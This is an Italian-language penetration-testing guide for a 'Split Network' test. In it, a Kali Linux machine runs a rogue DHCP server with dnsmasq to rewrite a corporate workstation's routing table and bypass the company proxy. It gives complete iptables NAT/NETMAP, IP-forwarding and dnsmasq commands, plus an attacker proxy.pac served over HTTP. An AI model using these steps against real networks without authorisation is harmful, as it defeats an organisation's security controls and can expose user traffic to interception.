In questa sezione sono descritti i diversi step necessari per effettuare uno Split Network.

Il Rouge DHCP Server Gateway può essere impostato mediante l’utilizzo di una macchina Kali Linux connessa ad Internet.

Per iniziare il test, collegare il client/workstation dell’utente alla rete aziendale all’interno di un ufficio (No VPN), successivamente mettere in collegamento la macchina Kali Linux al client dell’utente (ad esempio mediante cavo Ethernet o rogue hotspot WiFi o altro) e assicurarsi che la Kali Linux sia connessa ad Internet (ad esempio mediante WiFi Tethering da smartphone).

Sul terminal del client dell’utente, digitando:
```
ipconfig
```
dovremmo osservare una ulteriore interfaccia di rete.

Sul client dell’utente assicurarsi inizialmente che le misure di sicurezza implementate funzionino correttamente, ad esempio da browser, se si tenta di scaricare l'eseguibile di Nmap, si ottiene un messaggio di errore da parte del proxy che blacklista la nostra richiesta.

Allo stesso modo, se provassimo ad effettuare il download mediante cURL da terminale:
```
C:
cd Users\Public\Downloads
curl -o nmap.exe https://nmap.org/dist/nmap-7.94-setup.exe
```
otteniamo sempre un errore.

Abbiamo due scenari di attacco:
* Routing di una specifica sottorete (ad esempio relativa ad nmap.org) verso la macchina Kali Linux al fine di effettuare il download dell’eseguibile bloccato. Questo può essere effettuato NON tramite browser perché il browser passa attraverso il proxy aziendale;
* Routing della connessione relativa proxy aziendale verso la macchina Kali Linux. In questo caso è possibile accedere a tutte le risorse esterne che normalmente sarebbero bloccate. In questo scenario, non è possibile accedere contemporaneamente alla rete aziendale.

Questi scenari non sono applicabili nel caso in cui la VPN sia attiva perché essa ignora la routing table impostata.

## Scenario 1: Routing di una specifica sottorete
Per procedere al test, sulla macchina Kali Linux, supponiamo di aver connesso tale endpoint al client utente mediante cavo Ethernet. Sul terminale di Kali Linux, digitando:
```
ifconfig
```
dovremmo avere le informazioni relative all’interfaccia della porta Ethernet (i.e., eth0) ma senza un indirizzo IP. Di conseguenza, dobbiamo assegnarne uno, mediante:
```
sudo ifconfig eth0 192.168.230.1 up
```
Abilitare l’IP forwarding:
```
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```
Successivamente, supponendo che la macchina Kali Linux sia connessa mediante WiFi ad una rete (i.e., Tethering su smartphone), è necessario implementare una regola di Network Address Translation (NAT) sulla tabella NAT di iptables, mediante:
```
sudo iptables -t nat -A POSTROUTING -s 192.168.230.0/24 -o wlan0 -j MASQUERADE
```
Questo comando crea una regola che è progettata per gestire il traffico in uscita dalla rete locale con indirizzi IP nella gamma 192.168.230.0/24 attraverso l'interfaccia wireless wlan0 (interfaccia di rete mediante la quale la macchina è connessa ad Internet). L'azione specificata è MASQUERADE, che consente di nascondere gli indirizzi IP interni dietro l'indirizzo IP pubblico dell'interfaccia di uscita, facilitando così la condivisione di una singola connessione Internet con più dispositivi sulla rete locale. In sostanza, il comando supporta la condivisione della connessione Internet sulla rete locale attraverso la traduzione degli indirizzi IP.

Per verificare che la regola sia stata effettivamente creata, digitare:
```
sudo iptables -t nat -L
```
Ora, è necessario rendere la macchina Kali Linux un DHCP server che ha l’obiettivo di andare a scrivere la routing table della macchina vittima. Nella routing table andremo a scrivere una regola che forzerà la connessione verso una rete specifica di andare verso Internet attraverso la Kali Linux. La sottorete per il nostro test appartiene a nmap.org in modo da effettuare il download dell’eseguibile generalmente bloccato.
```
sudo dnsmasq --no-daemon --log-queries --log-dhcp --interface=eth0 --dhcp-authoritative --dhcp-range=192.168.230.100,192.168.230.200,1h --dhcp-option=option:router --dhcp-option=option:classless-static-route,45.33.49.0/24,192.168.230.1
```
Una volta applicato il comando, è possibile effettuare il download dell’eseguibile dal client dell’utente esclusivamente mediante terminale (i.e., curl) perché il browser è forzato ad utilizzare il proxy aziendale:
```
curl -o nmap.exe https://nmap.org/dist/nmap-7.94-setup.exe
```
Se dnsmasq sembra non produrre tante linee di output, è probabile che, in Kali Linux, NetworkManager ovvero lo strumento che gestisce le connessioni in Linux, possa aver automaticamente resettato le impostazioni effettuate sull’interfaccia eth0. Prima di tutto controllare se un indirizzo IPv4 è assegnato:
```
ifconfig eth0
```
Se sì, e si è connessi mediante Ethernet/USB tra la macchina Kali Linux e il client dell’utente, rimuovere e reinserire il cavo Ethernet/USB.
Se no, riassegnare l’indirizzo IP sul terminale della Kali Linux:
```
sudo ifconfig eth0 192.168.230.1 up
```
e controllare se la regola del POSTROUTING sulla iptables NAT è ancora inserita, come mostrato sopra. Successivamente, rimuovere e reinserire il cavo Ethernet/USB. Infine, rieseguire il comando dnsmasq come sopra.

Assicurarsi anche che la IP table non abbia delle regole impostate in precedenza che possano impattare il test.

## Scenario 2: Routing della connessione relativa al proxy aziendale
Il primo passo è ottenere l’indirizzo IP del proxy. Andare nelle impostazioni proxy del client Windows e identificare il campo dove è riportato l’URL del proxy.pac, ad esempio: http://url-proxy.yourdomain.net/proxy.pac.
Recuperare l’indirizzo IP relativo a url-proxy.yourdomain.net mediante il comando ping per ottenere il relativo indirizzo IP.

Per procedere al test, sulla macchina Kali Linux, supponiamo di aver connesso tale endpoint al client utente mediante cavo Ethernet. Sul terminale di Kali Linux, digitando:
```
ifconfig
```
dovremmo avere le informazioni relative all’interfaccia della porta Ethernet (i.e., eth0) ma senza un indirizzo IP. Di conseguenza, dobbiamo assegnarne uno, mediante:
```
sudo ifconfig eth0 192.168.230.1 up
```
Abilitare l’IP forwarding:
```
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```
Successivamente, supponendo che la macchina Kali Linux sia connessa mediante WiFi ad una rete (i.e., Tethering su smartphone), è necessario implementare una regola di Network Address Translation (NAT) sulla tabella NAT di iptables, mediante:
```
sudo iptables -t nat -A PREROUTING -d <IP-address-proxy>/32 -j NETMAP --to 192.168.230.1/32
```
Questo comando crea una regola che è progettata per mappare il traffico destinato all'indirizzo IP del proxy al nuovo indirizzo IP 192.168.230.1 nella fase di prerouting della tabella NAT.

Per verificare che la regola sia stata effettivamente creata, digitare:
```
sudo iptables -t nat -L
```
Se necessario, assicurarsi che regole che potrebbero causare problemi siano rimosse, mediante i seguenti comandi di esempio, il primo per avere la lista delle regole, e il secondo per eliminare la regola di interesse:
```
sudo iptables -t nat -S
sudo iptables -t nat -D POSTROUTING -s 192.168.230.0/24 -o wlan0 -j MASQUERADE
```
Ora, è necessario rendere la macchina Kali Linux un DHCP server che ha l’obiettivo di andare a scrivere la routing table della macchina vittima. Nella routing table andremo a scrivere una regola che forzerà ogni connessione verso il proxy aziendale verso la Kali Linux, dove esponiamo un HTTP server contenente il proxy.pac dell’attaccante.

Prima di tutto, creiamo il proxy.pac dell’attaccante in Kali Linux:
```
mkdir proxy
nano proxy.pac
```
e inseriamo il seguente contenuto:
```
function FindProxyForURL(url, host) {
    return "PROXY url-proxy.yourdomain.net:8080";
}
```
Successivamente, all’interno della cartella proxy che abbiamo creato, contenente il file proxy.pac, eseguire un HTTP service:
```
sudo python3 -m http.server 80
```
Se preferibile, è possibile intercettare le richieste in Burpsuite abilitando l’interception sull’interfaccia eth0 (o quella in utilizzo per il test).

Disconnettere e riconnettere il cavo che collega Kali Linux con il client utente, aprire un nuovo terminale ed eseguire:
```
sudo dnsmasq --interface=eth1 --port=0 --no-daemon --log-dhcp --dhcp-range=192.168.230.100,192.168.230.200,1h --dhcp-option=option:router --dhcp-option=option:classless-static-route,<IP-address-proxy>/24,192.168.230.1
```
Una volta applicato il comando, verificare sul client dell’utente che tramite browser è possibile navigare su Internet e che è possibile accedere a servizi che generalmente sono bloccati (ad esempio dropbox.com). In questo scenario, è possibile accedere ad Internet ma non è possibile accedere alla rete aziendale. In caso di necessità, disconnettere il cavo che collega Kali Linux al client dell’utente e l’accesso alla rete aziendale e nuovamente disponibile. Riconnetterlo, per avere nuovamente libero accesso alle risorse bloccate in Internet.

Se dnsmasq sembra non produrre tante linee di output, è probabile che, in Kali Linux, NetworkManager ovvero lo strumento che gestisce le connessioni in Linux, possa aver automaticamente resettato le impostazioni effettuate sull’interfaccia eth0. Prima di tutto controllare se un indirizzo IPv4 è assegnato:
```
ifconfig eth0
```
Se sì, e si è connessi mediante Ethernet/USB tra la macchina Kali Linux e il client dell’utente, rimuovere e reinserire il cavo Ethernet/USB.
Se no, riassegnare l’indirizzo IP sul terminale della Kali Linux:
```
sudo ifconfig eth0 192.168.230.1 up
```
e controllare se la regola del POSTROUTING sulla iptables NAT è ancora inserita, come mostrato sopra. Successivamente, rimuovere e reinserire il cavo Ethernet/USB. Infine, rieseguire il comando dnsmasq come sopra.

Assicurarsi anche che la IP table non abbia delle regole impostate in precedenza che possano impattare il test.
